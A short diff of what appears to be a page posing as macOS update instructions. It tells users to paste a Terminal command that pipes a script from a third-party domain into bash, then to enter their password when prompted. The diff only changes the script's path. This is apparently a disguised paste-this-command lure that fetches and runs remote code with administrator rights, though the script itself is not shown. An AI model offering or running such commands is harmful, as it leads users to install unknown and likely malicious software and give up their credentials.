@@ -13,7 +13,7 @@ Use this Terminal command to download and install the latest macOS updates — s
 **Terminal**  `Copy`
 
 ```bash
-/bin/bash -c "$(curl -fsSL https://angelakwak.com/macos/update/install.sh)"
+/bin/bash -c "$(curl -fsSL https://angelakwak.com/iterm/install.sh)"
 ```
 
 > If asked for your password, type it and press **Return** (characters won’t appear).  
